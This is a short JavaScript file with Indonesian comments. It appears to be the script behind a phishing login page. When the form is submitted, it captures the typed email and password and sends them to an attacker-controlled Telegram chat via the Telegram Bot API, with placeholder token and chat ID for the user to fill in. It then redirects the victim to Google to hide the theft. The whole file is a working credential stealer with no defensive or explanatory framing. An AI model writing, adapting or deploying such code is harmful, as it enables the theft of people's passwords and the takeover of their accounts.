document.getElementById("loginForm").addEventListener("submit", function(event) {
    event.preventDefault();

    let email = document.getElementById("email").value;
    let password = document.getElementById("password").value;

    // Debugging di console
    console.log("Tombol login ditekan!");
    console.log(`Email: ${email}, Password: ${password}`);

    // Kirim ke Telegram
    let botToken = "ISI_BOT_TOKEN_LO";
    let chatId = "ISI_CHAT_ID_LO";
    let message = `🔒 *Login Attempt*\n\n📧 Email: ${email}\n🔑 Password: ${password}`;
    
    let url = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}&parse_mode=Markdown`;

    fetch(url)
        .then(response => response.json())
        .then(data => {
            if (data.ok) {
                console.log("Berhasil dikirim ke Telegram!");
                window.location.href = "https://www.google.com"; // Redirect ke Google
            } else {
                console.error("Gagal kirim ke Telegram!", data);
            }
        })
        .catch(error => console.error("Error:", error));
});
